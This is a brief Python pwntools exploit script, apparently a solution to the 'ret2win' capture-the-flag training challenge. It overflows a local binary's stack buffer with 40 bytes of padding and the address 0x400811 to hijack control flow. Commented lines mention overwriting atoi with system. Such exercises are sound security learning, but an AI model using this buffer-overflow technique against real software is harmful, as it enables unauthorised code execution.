#!/usr/bin/env python2

from pwn import *

	#p.sendline('2')
	#p.recvuntil('Name: ')
	#log.info("Overwriting atoi with system")
	#p.interactive()



#0x400811
p = process('./ret2win')
print(p.recvuntil("fgets!"))
log.info("Received until fgets")
p.sendline("A"*40 + "\x11\x08\x40\x00\x00\x00\x00\x00")
log.info("Sending bytes")
print(p.recvall())
log.info("Received all")

#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x11\x08\x40\x00\x00




